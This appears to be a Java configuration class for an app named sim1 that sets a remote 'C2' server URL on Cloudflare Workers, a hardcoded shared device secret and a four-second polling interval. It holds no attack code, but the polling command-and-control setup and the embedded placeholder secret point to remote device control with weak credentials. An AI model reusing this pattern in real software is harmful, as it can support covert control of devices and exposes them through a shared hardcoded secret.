package com.gls.sim1;

public final class Config {
    // Public C2 base URL. Must be reachable from any network the device joins.
    // Cloudflare Worker (always-on free tier, no cold starts):
    //   "https://sim1-c2.messpass-prashildev.workers.dev"
    // A per-device override stored at runtime (Net.setServer) wins over this.
    public static final String SERVER = "https://sim1-c2.messpass-prashildev.workers.dev";
    public static final String DEVICE_SECRET = "sim1-shared-secret-change-me";
    public static final int POLL_MS = 4000;

    private Config() {}
}
